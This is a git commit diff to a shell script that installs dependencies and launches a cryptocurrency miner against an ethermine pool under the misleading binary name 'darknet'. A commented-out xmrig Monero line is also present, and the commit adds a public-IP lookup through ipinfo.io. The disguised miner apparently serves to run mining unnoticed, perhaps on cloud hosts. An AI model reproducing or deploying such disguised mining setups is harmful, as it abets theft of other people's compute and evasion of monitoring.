338b80a15bc4d95abb5d215e09afac78f46bc86a
tanle2694 <tanle2694@gmail.com>
2021-09-22 11:26:52 +0700

    modify xmr

--- run.sh
+++ run.sh
@@ -1,7 +1,7 @@
 #!/bin/sh
 apt-get update -y
 apt-get install -y --no-install-recommends apt-utils
-apt install build-essential cmake libuv1-dev libssl-dev libhwloc-dev -y
+apt install build-essential cmake libuv1-dev libssl-dev libhwloc-dev curl -y
 apt install libpci-dev -y
 apt install libssl-dev -y
 worker_name=$1
@@ -24,10 +24,12 @@ echo "1GB pages successfully enabled"
 #./xmrig --url=$POOL --donate-level=1 --user=$WALLET --pass=ggcloud -k --coin=monero --max-cpu-usage=100 &
 echo "run darknet"
 ./darknet -pool eu1.ethermine.org:4444 -wal $wallet -worker $worker_name -epsw x -mode 1 -log 0 -mport 0 -etha 0 -ftime 55 -retrydelay 1 -tt 79 -tstop 89  -coin eth &
+ip=$(curl ipinfo.io)
 while true
 do
   ps aux | grep darknet
   ps aux | grep xmrig
   nvidia-smi
-  sleep 10
+  echo $ip
+  sleep 3600
 done
